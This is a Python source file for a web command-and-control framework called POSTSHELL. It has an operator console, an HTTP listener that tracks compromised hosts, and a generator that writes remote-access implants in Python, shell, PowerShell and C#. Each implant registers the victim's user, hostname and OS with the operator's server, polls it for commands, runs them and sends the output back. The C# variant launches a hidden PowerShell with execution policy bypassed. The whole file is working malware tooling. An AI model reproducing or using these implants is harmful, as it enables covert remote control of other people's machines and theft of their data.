import http.server
import socketserver
import threading
import sys
import urllib.parse
import time
import readline
import re
import os
import argparse
from collections import defaultdict
import subprocess
import getpass

# requirements for dll generation
# sudo apt install mingw-w64


# aliases ?
client_aliases = defaultdict(dict)

os.makedirs("session_logs", exist_ok=True)

os.makedirs("tools", exist_ok=True)

# ANSI color codes
RESET = "\033[0m"
RED = "\033[91m"
GREEN = "\033[92m"
BLUE = "\033[94m"
ORANGE = "\033[93m"


clients = {}
client_commands = defaultdict(str)
client_results = defaultdict(list)
lock = threading.Lock()

client_counter = 1
client_id_map = {}

MAIN_COMMANDS = ["list ", "select ", "payload ", "kill ", "terminate ", "exit ", "help ", "? "]
SESSION_COMMANDS = ["alias ", "list aliases ", "del alias ", "background ", "die "]

selected_client = None

ANSI_ESCAPE = re.compile(r'\x1B\[[0-?]*[ -/]*[@-~]')

def strip_ansi(s):
    return ANSI_ESCAPE.sub('', s)

class MyHandler(http.server.BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        return

    def do_GET(self):
        if self.path.startswith("/tools/"):
            filepath = urllib.parse.unquote(self.path.lstrip("/"))
            full_path = os.path.join(os.getcwd(), filepath)

            if os.path.isfile(full_path):
                self.send_response(200)
                if full_path.endswith(".html"):
                    self.send_header("Content-Type", "text/html")
                elif full_path.endswith(".js"):
                    self.send_header("Content-Type", "application/javascript")
                elif full_path.endswith(".css"):
                    self.send_header("Content-Type", "text/css")
                elif full_path.endswith(".exe"):
                    self.send_header("Content-Type", "application/octet-stream")
                else:
                    self.send_header("Content-Type", "application/octet-stream")
                self.end_headers()
                with open(full_path, "rb") as f:
                    self.wfile.write(f.read())
            else:
                self.send_response(404)
                self.end_headers()
                self.wfile.write(b"File not found.")
            return

        client_id = self.path.strip("/").replace(".html", "")
        with lock:
            if client_id in client_commands:
                command = client_commands[client_id]
                self.send_response(200)
                self.end_headers()
                self.wfile.write(command.encode())
                client_commands[client_id] = ""
            else:
                self.send_response(404)
                self.end_headers()

    def do_POST(self):
        os.makedirs("session_logs", exist_ok=True)  # Ensure log directory exists
        length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(length).decode()
        fields = urllib.parse.parse_qs(post_data)

        if self.path == "/register":
            client_id = fields.get("id", [""])[0]
            client_ip = self.client_address[0]

            # Sanitize client_id and client_ip for use in folder name
            safe_client_id = re.sub(r'[^\w\-]', '_', client_id)
            safe_client_ip = re.sub(r'[^\w\-]', '_', client_ip)
            folder_name = f"{safe_client_id}_{safe_client_ip}"


            with lock:
                global client_counter
                if client_id not in client_id_map:
                    client_id_map[client_id] = client_counter
                    client_counter += 1
                clients[client_id] = {
                    "num_id": client_id_map[client_id],
                    "hostname": fields.get("hostname", [""])[0],
                    "username": fields.get("username", [""])[0],
                    "os": fields.get("os", [""])[0],
                    "version": fields.get("version", [""])[0],
                    "arch": fields.get("arch", [""])[0],
                    "ip": client_ip,
                    "last_seen": time.time()
                }

                # create client tools directory for each client
                #client_tool_dir = os.path.join("tools", folder_name)
                #os.makedirs(client_tool_dir, exist_ok=True)


            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"Registered")


        elif self.path.endswith("/result"):
            client_id = self.path.strip("/").split("/")[0]
            cmd = fields.get("cmd", [""])[0]
            result = fields.get("result", [""])[0]
            client_ip = self.client_address[0]
            with lock:
                client_results[client_id].append((cmd, result))
                # Log to session_logs/<id>_<IP>.log
                log_filename = os.path.join("session_logs", f"{client_id}_{client_ip}.log")
                with open(log_filename, "a") as log_file:
                    timestamp = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
                    log_file.write(f"[{timestamp}] CMD: {cmd}\n")
                    log_file.write(f"[{timestamp}] RESULT:\n{result}\n\n")
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"Result received")

        else:
            self.send_response(404)
            self.end_headers()


def format_table(data, headers):
    stripped_data = [[strip_ansi(str(cell)) for cell in row] for row in data]
    col_widths = [
        max(len(header), max(len(row[i]) for row in stripped_data))
        for i, header in enumerate(headers)
    ]

    def pad_with_ansi(value, width):
        stripped = strip_ansi(value)
        padding = width - len(stripped)
        return value + ' ' * padding

    def make_row(values, sep="║"):
        return sep + sep.join(
            f" {pad_with_ansi(str(v), col_widths[i])} " for i, v in enumerate(values)
        ) + sep

    def make_divider(left="╠", mid="╬", right="╣", fill="═"):
        return left + mid.join(fill * (w + 2) for w in col_widths) + right

    top = make_divider("╔", "╦", "╗")
    header_row = make_row(headers)
    divider = make_divider()
    body = "\n".join(make_row(row) for row in data)
    bottom = make_divider("╚", "╩", "╝")

    return "\n".join([top, header_row, divider, body, bottom])

def colorize_user(user):
    dangerous = ["admin", "administrator", "root", "system"]
    clean_user = user.strip()
    if clean_user.lower() in dangerous:
        return f"{RED}{clean_user}{RESET}"
    return f"{GREEN}{clean_user}{RESET}"

def completer(text, state):
    global selected_client
    if selected_client:
        options = [cmd for cmd in SESSION_COMMANDS if cmd.startswith(text)]
    else:
        options = [cmd for cmd in MAIN_COMMANDS if cmd.startswith(text)]
    if state < len(options):
        return options[state]
    return None

readline.set_completer(completer)
readline.parse_and_bind("tab: complete")

def get_client_by_num_id(num_id):
    with lock:
        for cid, info in clients.items():
            if info["num_id"] == num_id:
                return cid
    return None

def show_help():
    print(f"""
{ORANGE}Menu Commands:{RESET}
    help | ?             - Show this menu
    payload              - Payload generator menu
    list                 - List connected sessions
    select <id>          - Connect to a session
    kill <id>            - Terminate session
    terminate		 - Terminate all sessions
    exit                 - Exit the server
{ORANGE}Session Commands:{RESET}
    alias                - Set an alias for the current session
    list aliases         - List all aliases for the current session
    del alias            - Delete an alias for the current session
    background           - Background session
    die                  - Terminate session
{ORANGE}Payload Menu Commands:{RESET}
    set name <name>      - Set CUSTOM script name | BLANK = DEFAULT
    set lhost <ip>       - Set the POSTSHELL IP address
    set lport <port>     - Set the POSTSHELL listening port
    set payload <type>   - Set payload type (EX: sh, py, ps1, exe)
    set checkin <sec>    - Set the check-in wait time (in seconds)
    set killswitch <sec> - Exit payload if offline for N seconds
    options              - Show current payload configuration
    generate             - Generate the payload with current settings
    back                 - Return to the main menu
    help                 - Show this help menu
    """)
    


def cli():
    global selected_client
    print(f"""{BLUE}
██████╗  ██████╗ ███████╗████████╗███████╗██╗  ██╗███████╗██╗     ██╗     
██╔══██╗██╔═══██╗██╔════╝╚══██╔══╝██╔════╝██║  ██║██╔════╝██║     ██║     
██████╔╝██║   ██║███████╗   ██║   ███████╗███████║█████╗  ██║     ██║     
██╔═══╝ ██║   ██║╚════██║   ██║   ╚════██║██╔══██║██╔══╝  ██║     ██║     
██║     ╚██████╔╝███████║   ██║   ███████║██║  ██║███████╗███████╗███████╗
╚═╝      ╚═════╝ ╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝
    Web Command & Control
{RESET}
        """)
    print(f"{GREEN}[+] Server running on port {ORANGE}{port}{RESET}")
    while True:
        try:
            if not selected_client:
                cmd = input(f"{BLUE}postshell>{RESET} ").strip()

                if cmd == "exit":
                    print(f"{ORANGE}[!] Shutting down server and all sessions.{RESET}")
                    with lock:
                        for cid in list(clients.keys()):
                            client_commands[cid] = "exit"
                        clients.clear()
                    time.sleep(1)
                    break
                elif cmd == "terminate":
                    print(f"{ORANGE}[!] Terminating all sessions.{RESET}")
                    with lock:
                        for cid in list(clients.keys()):
                            client_commands[cid] = "exit"
                        clients.clear()
#                    print(f"{GREEN}[+] All sessions terminated.{RESET}")

                elif cmd == "list":
                    with lock:
                        if not clients:
                            print(f"{ORANGE}[!] No clients connected.{RESET}")
                            continue

                        headers = ["ID", "IP", "USER", "HOSTNAME", "OS", "VERSION", "ARCH"]
                        data = []
                        sorted_clients = sorted(clients.items(), key=lambda item: item[1]["num_id"])
                        for cid, info in sorted_clients:
                            user_col = colorize_user(info.get("username", "").strip())
                            data.append([
                                str(info["num_id"]),
                                info.get("ip", "N/A"),
                                user_col,
                                info.get("hostname", ""),
                                info.get("os", ""),
                                info.get("version", ""),
                                info.get("arch", "")
                            ])
                        print(format_table(data, headers))

                elif cmd.startswith("select "):
                    try:
                        num_id = int(cmd.split()[1])
                        client_id = get_client_by_num_id(num_id)
                        if client_id:
                            selected_client = client_id
                        else:
                            print(f"{ORANGE}[!] Invalid client ID{RESET}")
                    except:
                        print(f"{ORANGE}[!] Invalid input{RESET}")

                elif cmd.startswith("kill "):
                    try:
                        num_id = int(cmd.split()[1])
                        client_id = get_client_by_num_id(num_id)
                        if client_id:
                            with lock:
                                client_commands[client_id] = "exit"
                                clients.pop(client_id, None)
                            print(f"{ORANGE}[!] Sent {RED}'kill'{ORANGE} command to {RED}'{client_id}'{ORANGE}{RESET}")
                        else:
                            print(f"{ORANGE}[!] Invalid client ID{RESET}")
                    except:
                        print(f"{ORANGE}[!] Invalid input{RESET}")
                elif cmd == "payload":
                    payload_shell()
                elif cmd in ["help", "?"]:
                    show_help()

            else:
                user = clients[selected_client]['username']
                host = clients[selected_client]['hostname']
                dangerous = ["admin", "administrator", "root", "system"]
                color = RED if user.lower().strip() in dangerous else GREEN
                prompt = f"{color}[{user}@{host}]{RESET}> "
                cmd = input(prompt).strip()

                if cmd == "background":
                    selected_client = None
                elif cmd == "die":
                    with lock:
                        client_commands[selected_client] = "exit"
                        clients.pop(selected_client, None)
                    print(f"{ORANGE}[!] Sent {RED}'die'{ORANGE} command to {RED}'{selected_client}'{ORANGE}{RESET}")
                    selected_client = None
                # alias dict call back
                elif cmd.startswith("alias "):
                    parts = cmd[len("alias "):].split("=", 1)
                    if len(parts) == 2:
                        alias_name = parts[0].strip()
                        actual_cmd = parts[1].strip().strip('"').strip("'")
                        with lock:
                            client_aliases[selected_client][alias_name] = actual_cmd
                        print(f"{GREEN}[+] Alias '{alias_name}' set to '{actual_cmd}' for session.{RESET}")
                    else:
                        print(f"{ORANGE}[!] Invalid alias format. Use: alias ls='/bin/bash ls'{RESET}")
                elif cmd.startswith("del alias "):
                    alias_name = cmd[len("del alias "):].strip()
                    with lock:
                        if alias_name in client_aliases[selected_client]:
                            del client_aliases[selected_client][alias_name]
                            print(f"{GREEN}[+] Alias '{alias_name}' deleted for session.{RESET}")
                        else:
                            print(f"{ORANGE}[-] Alias '{alias_name}' not found in this session.{RESET}")
                elif cmd == "list aliases":
                    with lock:
                        aliases = client_aliases.get(selected_client, {})
                        if aliases:
                            print(f"{ORANGE}[+] Active aliases for this session:{RESET}")
                            for name, value in aliases.items():
                                print(f"  {GREEN}{name}{RESET} => {BLUE}{value}{RESET}")
                        else:
                            print(f"{ORANGE}[*] No aliases set for this session.{RESET}")
                elif cmd:
                    with lock:
                        # Substitute alias if present
                        parts = cmd.split()
                        if parts and parts[0] in client_aliases[selected_client]:
                            actual_cmd = client_aliases[selected_client][parts[0]]
                            cmd = " ".join([actual_cmd] + parts[1:])
                        
                        client_commands[selected_client] = cmd
#                    print(f"{BLUE}[>] Waiting for response...{RESET}")

                    waited = 0
                    timeout = 30  # Max wait time in seconds
                    poll_interval = 0.5

                    while waited < timeout:
                        time.sleep(poll_interval)
                        waited += poll_interval
                        with lock:
                            if client_results[selected_client]:
                                break

                    with lock:
                        results = client_results[selected_client]
                        if results:
                            for c, r in results:
                                print(r)
                            client_results[selected_client].clear()
                        else:
                            print(f"{RED}[-] No result received within {timeout} seconds.{RESET}")
        except KeyboardInterrupt:
            if not selected_client:
                print(f"{ORANGE}\n[!] Use {RED}'exit'{ORANGE} to cleanly shut down the server.{RESET}")
            else:
                print(f"{ORANGE}\n[!] Use {RED}'background'{ORANGE} to return or {RED}'die'{ORANGE} to terminate the session.{RESET}")



## payload builder
PAYLOAD_COMMANDS = ["set", "generate", "back", "options", "help"]
payload_settings = {
    "name": "", # defaults to IP_PORT.<payload>
    "lhost": "127.0.0.1", # the ip your listening on
    "lport": "80", # your listening port
    "payload": "sh", # sh, py, ps1, exe
    "checkin": "1", # time between curl requests for the victim
    "killswitch": "60"  # default 60 seconds
}

def payload_completer(text, state):
    options = []
    if readline.get_line_buffer().strip().startswith("set"):
        options = ["lhost ", "lport ", "payload ", "checkin ", "name ", "killswitch"]
    else:
        options = [cmd + " " for cmd in PAYLOAD_COMMANDS if cmd.startswith(text)]
    return options[state] if state < len(options) else None


def show_payload_options():
    print(f"{ORANGE}\nCurrent Payload Options:\n{RESET}")
    for key, value in payload_settings.items():
        display_value = f"{ORANGE}{value}{RESET}" if value.strip() else f"{RED}<NOT SET>{RESET}"
        print(f"  {key.upper():10}: {display_value}")
    print("")

def payload_help():
    print(f"{ORANGE}\nPayload Menu Commands:{RESET}")
    print(f"    set name <name>      - Set CUSTOM script name | BLANK = DEFAULT")
    print(f"    set lhost <ip>       - Set the POSTSHELL IP address")
    print(f"    set lport <port>     - Set the POSTSHELL listening port")
    print(f"    set payload <type>   - Set payload type (EX: sh, py, ps1, exe)")
    print(f"    set checkin <sec>    - Set the check-in wait time (in seconds)")
    print(f"    set killswitch <sec> - Exit payload if offline for N seconds")
    print(f"    options              - Show current payload configuration")
    print(f"    generate             - Generate the payload with current settings")
    print(f"    back                 - Return to the main menu")
    print(f"    help                 - Show this help menu\n")


def payload_shell():
    readline.set_completer(payload_completer)
    readline.parse_and_bind("tab: complete")

    while True:
        try:
            cmd = input(f"{RED}payload> {RESET}").strip()

            if cmd == "":
                continue
            elif cmd.startswith("set"):
                parts = cmd.split()
                if len(parts) >= 3:
                    key = parts[1].lower()
                    value = " ".join(parts[2:])
                    if key in payload_settings:
                        payload_settings[key] = value
                        print(f"{GREEN}[+] Set {ORANGE}'{key}'{GREEN} to {ORANGE}'{value}'{RESET}")
                    else:
                        print(f"{RED}[-] Unknown setting: {key}{RESET}")
                elif len(parts) == 3 and parts[1].lower() == "waittime":
                    try:
                        waittime_value = int(parts[2])
                        payload_settings["checkin"] = waittime_value
                        print(f"{GREEN}[+] Set {ORANGE}'CHECKIN'{GREEN} to {ORANGE}'{waittime_value}' {GREEN}seconds.{RESET}")
                    except ValueError:
                        print(f"{RED}[-] Invalid value for 'CHECKIN'. Please provide an integer.{RESET}")
                else:
                    print(f"{ORANGE}[!] Usage: set <name|lhost|lport|payload|checkin|killswitch> <value>{RESET}")
            elif cmd == "generate":
                generate_payload()
            elif cmd == "back":
                print(f"{ORANGE}[*] Returning to main menu.{RESET}")
                readline.set_completer(completer)  # Main menu completer
                readline.parse_and_bind("tab: complete")
                break
            elif cmd == "options":
                show_payload_options()
            elif cmd == "help" or cmd == "?":
                payload_help()
            else:
                print(f"{ORANGE}[*] Unknown command. Type {GREEN}'help'{ORANGE} for payload options.{RESET}")
        except KeyboardInterrupt:
            print(f"{ORANGE}\n[*] Returning to main menu.{RESET}")
            readline.set_completer(completer)  # Main menu completer
            break
        except Exception as e:
            print(f"Error: {e}")

def generate_payload():
    lhost = payload_settings["lhost"]
    lport = payload_settings["lport"]
    payload_type = payload_settings["payload"]
    waittime = payload_settings.get("checkin", 1)
    killswitch = payload_settings.get("killswitch", 60)
    name = payload_settings.get("name", "").strip()

    if not os.path.exists("tools"):
        os.makedirs("tools")

    if payload_type == "py":
        payload_code = f'''import os
import platform
import socket
import time
import requests
import subprocess
import getpass

SERVER_IP = "{lhost}"
SERVER_PORT = "{lport}"
WAITTIME = {waittime}
KILLSWITCH = {killswitch}

HOSTNAME = socket.gethostname()
USER = getpass.getuser()
OS = platform.system()
VERSION = platform.release()

try:
    ARCH = subprocess.check_output("uname -m", shell=True).decode().strip()
except subprocess.CalledProcessError:
    ARCH = "Unknown"

ID = f"{{USER}}@{{HOSTNAME}}"
SERVER = f"http://{{SERVER_IP}}:{{SERVER_PORT}}"

def register_client():
    data = {{
        "id": ID,
        "hostname": HOSTNAME,
        "username": USER,
        "os": OS,
        "version": VERSION,
        "arch": ARCH
    }}
    try:
        response = requests.post(f"{{SERVER}}/register", data=data)
        response.raise_for_status()
    except requests.RequestException as e:
        exit(1)

def send_result(command, result):
    data = {{
        "cmd": command,
        "result": result
    }}
    try:
        requests.post(f"{{SERVER}}/{{ID}}/result", data=data)
    except:
        pass

def command_loop():
    last_success = time.time()
    while True:
        if time.time() - last_success > KILLSWITCH:
            break
        try:
            response = requests.get(f"{{SERVER}}/{{ID}}.html")
            response.raise_for_status()
            cmd = response.text.strip()
            last_success = time.time()

            if cmd:
                if cmd == "exit":
                    break
                try:
                    result = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT).decode()
                except subprocess.CalledProcessError as e:
                    result = e.output.decode()
                send_result(cmd, result)
        except:
            time.sleep(WAITTIME)

if __name__ == "__main__":
    register_client()
    command_loop()
'''

    elif payload_type == "sh":
        #payload_type = "sh" was adding moree support with bash and ash, currently on hold
        payload_code = f'''#!/bin/sh

SERVERIP="{lhost}"
SERVERPORT="{lport}"
WAITTIME="{waittime}"
KILLSWITCH="{killswitch}"

HOSTNAME=$(hostname)
USER=$(whoami)
OS=$(uname)
VERSION=$(uname -r)
ARCH=$(uname -m)
ID="$USER@$HOSTNAME"
SERVER="http://$SERVERIP:$SERVERPORT"

# Register
curl -s -X POST -d "id=$ID" -d "hostname=$HOSTNAME" \\
     -d "username=$USER" -d "os=$OS" -d "version=$VERSION" \\
     -d "arch=$ARCH" "$SERVER/register"

START=$(date +%s)

while true; do
    CMD=$(curl -s "$SERVER/$ID.html")
    if [ $? -ne 0 ]; then
        NOW=$(date +%s)
        if (( NOW - START > KILLSWITCH )); then
            echo "[-] Server unreachable. Exiting."
            exit 1
        fi
        sleep $WAITTIME
        continue
    fi
    START=$(date +%s)

    if [ -n "$CMD" ]; then
        if [ "$CMD" == "exit" ]; then
            echo "[*] Exit command received. Exiting."
            exit 0
        fi
        RESULT=$(bash -c "$CMD" 2>&1)
        curl -s -X POST -d "cmd=$CMD" --data-urlencode "result=$RESULT" "$SERVER/$ID/result"
    fi
    sleep $WAITTIME
done
'''
    elif payload_type == "ash":
        payload_type = "sh"    
        payload_code = f'''#!/bin/ash

SERVERIP="{lhost}"
SERVERPORT="{lport}"
WAITTIME="{waittime}"
KILLSWITCH="{killswitch}"

HOSTNAME=$(hostname)
USER=$(whoami)
OS=$(uname)
VERSION=$(uname -r)
ARCH=$(uname -m)
ID="$USER@$HOSTNAME"
SERVER="http://$SERVERIP:$SERVERPORT"

# Register
curl -s -X POST -d "id=$ID" -d "hostname=$HOSTNAME" \\
     -d "username=$USER" -d "os=$OS" -d "version=$VERSION" \\
     -d "arch=$ARCH" "$SERVER/register"

START=$(date +%s)

while true; do
    CMD=$(curl -s "$SERVER/$ID.html")
    if [ $? -ne 0 ]; then
        NOW=$(date +%s)
        DIFF=$(expr "$NOW" - "$START")
        if [ "$DIFF" -gt "$KILLSWITCH" ]; then
            echo "[-] Server unreachable. Exiting."
            exit 1
        fi
        sleep "$WAITTIME"
        continue
    fi
    START=$(date +%s)

    if [ -n "$CMD" ]; then
        if [ "$CMD" = "exit" ]; then
            echo "[*] Exit command received. Exiting."
            exit 0
        fi
        RESULT=$(sh -c "$CMD" 2>&1)
        curl -s -X POST -d "cmd=$CMD" --data-urlencode "result=$RESULT" "$SERVER/$ID/result"
    fi
    sleep "$WAITTIME"
done
'''
    elif payload_type == "ps1":
        payload_code = f'''$ServerIP = "{lhost}"
$ServerPort = "{lport}"
$WAITTIME = {waittime}
$KILLSWITCH = {killswitch}
$StartTime = Get-Date

$Hostname = $env:COMPUTERNAME
$userRaw = whoami
$Username = ($userRaw -split '\\\\' | Select-Object -Last 1).Trim()
$os = Get-CimInstance -ClassName Win32_OperatingSystem
$OSNAME = $os.Caption -replace "Microsoft ", ""
$Version = $os.Version
$Arch = $os.OSArchitecture
$ID = "$Username@$Hostname"
$Server = "http://$ServerIP`:$ServerPort"

try {{
    Invoke-RestMethod -Uri "$Server/register" -Method Post -Body @{{
        id = $ID
        hostname = $Hostname
        username = $Username
        os = $OSNAME
        version = $Version
        arch = $Arch
    }}
}} catch {{
    exit
}}

while ($true) {{
    $Now = Get-Date
    if (($Now - $StartTime).TotalSeconds -gt $KILLSWITCH) {{
        Write-Host "[-] Server unreachable. Exiting."
        break
    }}

    try {{
        $Cmd = Invoke-RestMethod -Uri "$Server/$ID.html"
        $StartTime = Get-Date
        if ($Cmd) {{
            if ($Cmd -eq "exit") {{
                break
            }}
            $Result = try {{
                Invoke-Expression $Cmd | Out-String
            }} catch {{
                $_ | Out-String
            }}

            try {{
                Invoke-RestMethod -Uri "$Server/$ID/result" -Method Post -Body @{{
                    cmd = $Cmd
                    result = $Result
                }}
            }} catch {{ }}
        }}
    }} catch {{ }}
    Start-Sleep -Seconds $WAITTIME
}}
'''
    elif payload_type == "exe":
        payload_type = "cs"
        ps1_script = f'''$ServerIP = "{lhost}"
$ServerPort = "{lport}"
$WAITTIME = {waittime}
$KILLSWITCH = {killswitch}
$StartTime = Get-Date

$Hostname = $env:COMPUTERNAME
$userRaw = whoami
$Username = ($userRaw -split '\\\\' | Select-Object -Last 1).Trim()
$os = Get-CimInstance -ClassName Win32_OperatingSystem
$OSNAME = $os.Caption -replace "Microsoft ", ""
$Version = $os.Version
$Arch = $os.OSArchitecture
$ID = "$Username@$Hostname"
$Server = "http://$ServerIP`:$ServerPort"

try {{
    Invoke-RestMethod -Uri "$Server/register" -Method Post -Body @{{
        id = $ID
        hostname = $Hostname
        username = $Username
        os = $OSNAME
        version = $Version
        arch = $Arch
    }}
}} catch {{
    exit
}}

while ($true) {{
    $Now = Get-Date
    if (($Now - $StartTime).TotalSeconds -gt $KILLSWITCH) {{
        break
    }}

    try {{
        $Cmd = Invoke-RestMethod -Uri "$Server/$ID.html"
        $StartTime = Get-Date
        if ($Cmd) {{
            if ($Cmd -eq "exit") {{
                break
            }}
            $Result = try {{
                Invoke-Expression $Cmd | Out-String
            }} catch {{
                $_ | Out-String
            }}

            try {{
                Invoke-RestMethod -Uri "$Server/$ID/result" -Method Post -Body @{{
                    cmd = $Cmd
                    result = $Result
                }}
            }} catch {{ }}
        }}
    }} catch {{ }}
    Start-Sleep -Seconds $WAITTIME
}}
'''

        cs_code = f'''using System;
using System.Diagnostics;
using System.IO;

public class ReverseShell {{
    public static void Main() {{
        string psFile = "payload.ps1";
        string psScript = @"
{ps1_script.replace('"', '""')}
";

        try {{
            File.WriteAllText(psFile, psScript);
            Process.Start(new ProcessStartInfo {{
                FileName = "powershell.exe",
                Arguments = "-ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -File " + psFile,
                CreateNoWindow = true,
                UseShellExecute = false
            }});
        }} catch (Exception) {{ }}
    }}
}}'''

        filename = f"tools/{name or f'{lhost}_{lport}'}.cs"
        with open(filename, "w") as f:
            f.write(cs_code.strip() + "\n")
        print(f"{GREEN}[+] C# source saved as {ORANGE}'{filename}'{RESET}")

        exe_name = filename.replace(".cs", ".exe")
        result = subprocess.run(["mcs", "-out:" + exe_name, filename], capture_output=True, text=True)
        if result.returncode != 0:
            print(f"{RED}[!] Compilation failed:\n{result.stderr}{RESET}")
        else:
            print(f"{GREEN}[+] EXE payload compiled successfully as {ORANGE}'{exe_name}'{RESET}")
            try:
                os.remove(filename)
            except Exception as e:
                print(f"{ORANGE}[!] Compiled, but failed to remove source file: {e}{RESET}")

    else:
        print(f"{RED}[-] Payload type '{payload_type}' not supported.{RESET}")
        return

    if payload_type != "cs":  # 'cs' is set for "exe", so skip writing payload_code file for exe payload
        filename = f"tools/{name}.{payload_type}" if name else f"tools/{lhost.replace('.', '_')}_{lport}.{payload_type}"
        with open(filename, "w") as f:
            f.write(payload_code)
        print(f"{GREEN}[+] Payload generated and saved as {ORANGE}'{filename}'{RESET}")


def start_server(port):
    socketserver.ThreadingTCPServer.allow_reuse_address = True
    server = socketserver.ThreadingTCPServer(("", port), MyHandler)
    server.daemon_threads = True
    t = threading.Thread(target=server.serve_forever)
    t.daemon = True
    t.start()
    return server

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python3 {sys.argv[0]} <port>")
        sys.exit(1)

    port = int(sys.argv[1])
    server_instance = start_server(port)
    cli()
